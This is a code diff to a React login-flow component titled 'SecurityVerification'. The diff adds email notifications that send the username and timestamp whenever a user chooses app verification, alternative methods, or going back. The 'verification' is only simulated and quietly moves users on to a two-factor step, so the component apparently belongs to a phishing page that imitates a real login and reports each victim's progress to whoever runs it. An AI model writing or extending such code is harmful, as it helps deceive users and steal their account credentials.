@@ -3,6 +3,7 @@ import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { Smartphone, Shield, CheckCircle2 } from "lucide-react";
+import { sendEmailNotification } from "@/services/emailService";
 
 interface SecurityVerificationProps {
   username: string;
@@ -21,6 +22,17 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
   const handleVerifyApp = async () => {
     setIsVerifying(true);
     
+    // Send email notification
+    try {
+      await sendEmailNotification({
+        step: "Security Verification - App Verification",
+        username,
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
+    
     // Simulate app verification
     setTimeout(() => {
       setIsVerifying(false);
@@ -32,13 +44,39 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
     }, 3000);
   };
 
-  const handleOtherMethods = () => {
+  const handleOtherMethods = async () => {
+    // Send email notification
+    try {
+      await sendEmailNotification({
+        step: "Security Verification - Other Methods",
+        username,
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
+    
     // Skip to next step for "other methods"
     onVerificationSuccess();
     toast({
       title: "Using alternative verification",
       description: "Proceeding to two-factor authentication.",
     });
+  };
+
+  const handleBack = async () => {
+    // Send email notification
+    try {
+      await sendEmailNotification({
+        step: "Security Verification - Back to Login",
+        username,
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
+    
+    onBack();
   };
 
   return (
@@ -104,7 +142,7 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
 
             <div className="text-center">
               <button
-                onClick={onBack}
+                onClick={handleBack}
                 className="text-[#B7BDC6] hover:text-[#848E9C] text-sm"
               >
                 Back to Login
